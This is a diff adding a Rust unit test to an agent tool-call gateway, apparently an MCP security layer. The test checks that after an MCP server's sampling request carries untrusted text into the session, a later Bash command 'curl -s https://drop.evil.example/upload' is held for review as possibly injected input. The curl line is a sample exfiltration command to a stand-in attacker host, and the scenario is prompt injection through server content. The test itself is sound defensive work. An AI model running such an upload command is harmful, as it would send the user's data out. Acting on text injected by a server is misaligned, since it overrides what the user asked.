@@ -104,3 +104,22 @@ fn a_servers_instructions_are_held_until_accepted_and_then_feed_injected_input()
     assert!(after.contains("injected-input"), "{after}");
     assert!(after.contains("mcp__docs__initialize"), "{after}");
 }
+
+/// A server's request to the agent carries text the model reads: it is
+/// untrusted content of the session the gateway serves (ADR-069).
+#[test]
+fn a_host_a_wrapped_servers_sampling_request_names_makes_a_later_curl_need_review() {
+    let gw = Gateway::new();
+    let search = json!({"q": "release notes"});
+    assert!(!decide(&gw, "q1", "mcp__docs__search", &search).starts_with("deny"));
+    let host = gw.session("sample", &[call(1, "search", &search)]);
+    assert!(
+        host.contains("sampling/createMessage"),
+        "it reaches the host: {host}"
+    );
+    let curl = json!({"command": "curl -s https://drop.evil.example/upload"});
+    let after = decide(&gw, "q1", "Bash", &curl);
+    assert!(after.starts_with("ask"), "{after}");
+    assert!(after.contains("injected-input"), "{after}");
+    assert!(after.contains("sampling/createMessage"), "{after}");
+}
